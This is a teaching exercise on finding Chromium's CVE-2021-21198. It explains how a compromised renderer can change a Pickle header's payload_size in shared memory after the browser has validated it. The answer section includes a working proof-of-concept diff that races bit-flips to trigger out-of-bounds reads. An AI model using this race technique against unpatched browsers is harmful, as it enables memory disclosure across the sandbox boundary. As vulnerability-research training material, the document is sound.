# Exercise 6

In LEVEL 1, we can relay on Details and just to search for the func which Details mentioned. It is far away from the real bug hunting scene.

LEVEL 2 we do the same as LEVEL 1 without the help of Details.

But the bug report need Poc to assist developer reproduce the vulnerability, and know exactly what cause this bug. So LEVEL 3 need we construct Poc by ourselves.

## CVE-2021-21198
I sugget you don't search any report about it to prevents get too much info like patch. Our goal is to find some bugs, not construct Poc. But in truth, Poc can proof that we are right.



### Details

In level 3, we do it without the help of Details


---------

<details>
  <summary>For more info click me! But you'd better not do this</summary>

  https://bugs.chromium.org/p/chromium/issues/detail?id=1184399

</details>

--------

### Set environment

after fetch chromium
```sh
git reset --hard 983a7365ebe7fa934fb4660409105bae294d70a5
```



### Related code
```c++
// Typemapped such that arbitrarily large IPC::Message objects can be sent and
// received with minimal copying.
struct Message {
  mojo_base.mojom.BigBuffer buffer;
  array<mojo.native.SerializedHandle>? handles;
};
========================================
union BigBuffer {
  array<uint8> bytes;
  BigBufferSharedMemoryRegion shared_memory;
  bool invalid_buffer;
};
```
ipc/ipc_message_pipe_reader.cc
base/pickle.cc


tips: You just need to think how `shared_memory` can be used to breaking mojo.

### Do it
Do this exercise by yourself, when you have some idea, you can compare your answer with me. If you find my answer have something wrong, please tell me.


---------

<details>
  <summary>My answer</summary>

  ```c++
// Typemapped such that arbitrarily large IPC::Message objects can be sent and
// received with minimal copying.
struct Message {
  mojo_base.mojom.BigBuffer buffer;       [1]
  array<mojo.native.SerializedHandle>? handles;
};
=======================================
union BigBuffer {
  array<uint8> bytes;
  BigBufferSharedMemoryRegion shared_memory;  [2]
  bool invalid_buffer;
};
  ```
  [1] | [2] `BigBuffer` is backed by an `array` of bytes when the message is **small**; but it's backed by `shared memory` if the message is **large**. This means that a malicious renderer can send legacy `IPC messages` backed by `shared memory`.

  ```c++
void MessagePipeReader::Receive(MessageView message_view) {
  if (!message_view.size()) {
    delegate_->OnBrokenDataReceived();
    return;
  }
  Message message(message_view.data(), message_view.size()); [3]
  if (!message.IsValid()) {
    delegate_->OnBrokenDataReceived();
    return;
  }
[ ... ]
  ```
  [3] `ipc::Message` inherits from `base::Pickle`
  ```c++
class IPC_MESSAGE_SUPPORT_EXPORT Message : public base::Pickle {
 public:
//[ ... ]
  // Initializes a message from a const block of data.  The data is not copied;
  // instead the data is merely referenced by this message.  Only const methods
  // should be used on the message when initialized this way.
  Message(const char* data, int data_len);
=============================================
Message::Message(const char* data, int data_len)
    : base::Pickle(data, data_len) {     [4]
  Init();
}
  ```
  The constructor of `Message` call `Pickle`'s constructor
  ```c++
Pickle::Pickle(const char* data, size_t data_len)
    : header_(reinterpret_cast<Header*>(const_cast<char*>(data))),
      header_size_(0),
      capacity_after_header_(kCapacityReadOnly),
      write_offset_(0) {
  if (data_len >= static_cast<int>(sizeof(Header)))     [5]
    header_size_ = data_len - header_->payload_size; 

  if (header_size_ > static_cast<unsigned int>(data_len))
    header_size_ = 0;
[ ... ]
  ```
  [5] after check `payload_size` at this point, we can chenge `payload_size` in Pickle's header by the other side which have the access of `shared_memory`

  Since `base::Pickle` expects to find a `header` at the start of the region, by changing the length field in that header after the checks in the `Pickle` constructor

  ```c++
PickleIterator::PickleIterator(const Pickle& pickle)
: payload_(pickle.payload()),
    read_index_(0),
    end_index_(pickle.payload_size()) {     [6]
}
===================================================
// This class provides facilities for basic binary value packing and unpacking.
//
// The Pickle's data has a header which contains the size of the Pickle's
// payload.  It can optionally support additional space in the header.  That
// space is controlled by the header_size parameter passed to the Pickle
// constructor.
//
class BASE_EXPORT Pickle {
 public:
 //[ ... ]
  // The payload is the pickle data immediately following the header.
  size_t payload_size() const {
    return header_ ? header_->payload_size : 0;    [7]
  }
  ```

  [6] ｜ [7] `PickleIterator`'s `end_index_ == header_->payload_size`, we can use it to oob read

  ```c++
// PickleIterator reads data from a Pickle. The Pickle object must remain valid
// while the PickleIterator object is in use.
class BASE_EXPORT PickleIterator {
 public:
  PickleIterator() : payload_(nullptr), read_index_(0), end_index_(0) {}
  explicit PickleIterator(const Pickle& pickle);

  // Methods for reading the payload of the Pickle. To read from the start of
  // the Pickle, create a PickleIterator from a Pickle. If successful, these
  // methods return true. Otherwise, false is returned to indicate that the
  // result could not be extracted. It is not possible to read from the iterator
  // after that.
  bool ReadBool(bool* result) WARN_UNUSED_RESULT;
  bool ReadInt(int* result) WARN_UNUSED_RESULT;
  bool ReadLong(long* result) WARN_UNUSED_RESULT;
  [ ... ]
  ```
  Set `PickleIterator.end_index_` to a huge num, we can get oob read by these Methods.

  **Poc**

  We can write code in source file

  The attached patch forces all legacy IPC messages sent by renderers to be sent as *shared memory*, and *creates a new thread* in each renderer that *flips the high bits of the payload_size* value for a short period after each message is sent; this has a "reasonable" chance of having valid values to pass through the checks, and then invalid values later on.
  ```diff
diff --git a/ipc/ipc_message_pipe_reader.cc b/ipc/ipc_message_pipe_reader.cc
index 6e7bf51b0e05..2d3b57e7a205 100644
--- a/ipc/ipc_message_pipe_reader.cc
+++ b/ipc/ipc_message_pipe_reader.cc
@@ -6,10 +6,13 @@
 
 #include <stdint.h>
 
+#include <iostream>
 #include <utility>
 
 #include "base/bind.h"
 #include "base/callback_helpers.h"
+#include "base/command_line.h"
+#include "base/debug/stack_trace.h"
 #include "base/location.h"
 #include "base/logging.h"
 #include "base/macros.h"
@@ -18,6 +21,13 @@
 #include "ipc/ipc_channel_mojo.h"
 #include "mojo/public/cpp/bindings/message.h"
 
+std::string GetProcessType() {
+  std::string type = base::CommandLine::ForCurrentProcess()->GetSwitchValueASCII("type");
+  if (type == "")
+    return "browser";
+  return type;
+}
+
 namespace IPC {
 namespace internal {
 
@@ -35,6 +45,10 @@ MessagePipeReader::MessagePipeReader(
   receiver_.set_disconnect_handler(
       base::BindOnce(&MessagePipeReader::OnPipeError, base::Unretained(this),
                      MOJO_RESULT_FAILED_PRECONDITION));
+  if (GetProcessType() == "renderer") {
+    race_thread_ = std::make_unique<base::Thread>("race_thread");
+    race_thread_->Start();
+  }
 }
 
 MessagePipeReader::~MessagePipeReader() {
@@ -49,6 +63,17 @@ void MessagePipeReader::Close() {
     receiver_.reset();
 }
 
+static void race_ipc_message(mojo::ScopedSharedBufferHandle shm_handle) {
+  auto mapping = shm_handle->Map(0x100);
+  fprintf(stderr, "racing\n");
+  volatile uint32_t* ptr = (volatile uint32_t*)mapping.get();
+  for (int i = 0; i < 0x80000; ++i) {
+    *ptr ^= 0x23230000;
+  }
+  *ptr ^= 0x23230000;
+  fprintf(stderr, "done racing\n");
+}
+
 bool MessagePipeReader::Send(std::unique_ptr<Message> message) {
   CHECK(message->IsValid());
   TRACE_EVENT_WITH_FLOW0("toplevel.flow", "MessagePipeReader::Send",
@@ -62,9 +87,27 @@ bool MessagePipeReader::Send(std::unique_ptr<Message> message) {
   if (!sender_)
     return false;
 
-  sender_->Receive(MessageView(*message, std::move(handles)));
-  DVLOG(4) << "Send " << message->type() << ": " << message->size();
-  return true;
+  if (GetProcessType() == "renderer") {
+    auto shm_handle = mojo::SharedBufferHandle::Create(message->size() > 0x1000 ? message->size() : 0x1000);
+    auto shm_handle_copy = shm_handle->Clone(mojo::SharedBufferHandle::AccessMode::READ_WRITE);
+
+    mojo_base::internal::BigBufferSharedMemoryRegion shm_region(std::move(shm_handle), message->size());
+    memcpy(shm_region.memory(), message->data(), message->size());
+    mojo_base::BigBufferView big_buffer_view;
+    big_buffer_view.SetSharedMemory(std::move(shm_region));
+
+    race_thread_->task_runner()->PostTask(FROM_HERE, 
+      base::BindOnce(race_ipc_message, std::move(shm_handle_copy)));
+
+    sender_->Receive(MessageView(std::move(big_buffer_view), std::move(handles)));
+
+    DVLOG(4) << "Send " << message->type() << ": " << message->size();
+    return true;
+  } else {
+    sender_->Receive(MessageView(*message, std::move(handles)));
+    DVLOG(4) << "Send " << message->type() << ": " << message->size();
+    return true;
+  }
 }
 
 void MessagePipeReader::GetRemoteInterface(
diff --git a/ipc/ipc_message_pipe_reader.h b/ipc/ipc_message_pipe_reader.h
index b7f73d2a9aee..6c26987dadcd 100644
--- a/ipc/ipc_message_pipe_reader.h
+++ b/ipc/ipc_message_pipe_reader.h
@@ -15,6 +15,7 @@
 #include "base/component_export.h"
 #include "base/macros.h"
 #include "base/process/process_handle.h"
+#include "base/threading/thread.h"
 #include "base/threading/thread_checker.h"
 #include "ipc/ipc.mojom.h"
 #include "ipc/ipc_message.h"
@@ -106,6 +107,9 @@ class COMPONENT_EXPORT(IPC) MessagePipeReader : public mojom::Channel {
   Delegate* delegate_;
   mojo::AssociatedRemote<mojom::Channel> sender_;
   mojo::AssociatedReceiver<mojom::Channel> receiver_;
+
+  std::unique_ptr<base::Thread> race_thread_;
+
   base::ThreadChecker thread_checker_;
 
   DISALLOW_COPY_AND_ASSIGN(MessagePipeReader);

  ```


</details>

--------
